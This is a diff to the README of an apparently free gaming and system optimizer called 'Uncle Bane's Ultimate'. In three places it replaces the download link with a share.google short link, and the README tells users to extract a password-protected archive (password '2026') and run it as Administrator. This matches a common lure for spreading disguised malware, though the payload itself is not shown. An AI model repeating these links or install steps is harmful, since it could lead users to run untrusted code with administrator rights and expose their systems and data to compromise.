@@ -9,7 +9,7 @@ The **🎮 Uncle Bane's Ultimate** is a **free** gaming and system optimization 
 
 <div align="center">
 
-[![Download Uncle Bane's Ultimate](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/uncle-banes-ultimate)
+[![Download Uncle Bane's Ultimate](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/LaYwNMXjDKtM3vEcA)
 
 </div>
 
@@ -108,7 +108,7 @@ Every gamer knows the frustration of lag, low FPS, and slow system performance. 
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Complete setup → Launch
 
-[![Download Uncle Bane's Ultimate](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/uncle-banes-ultimate)
+[![Download Uncle Bane's Ultimate](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/LaYwNMXjDKtM3vEcA)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -249,7 +249,7 @@ Boost your gaming performance for free. **Uncle Bane's Ultimate** provides game 
 
 <div align="center">
 
-[![Download Uncle Bane's Ultimate](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/uncle-banes-ultimate)
+[![Download Uncle Bane's Ultimate](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/LaYwNMXjDKtM3vEcA)
 
 **Version 4.6.1** — Free gaming optimizer. April 2026 update. Zero cost. No payment.
 
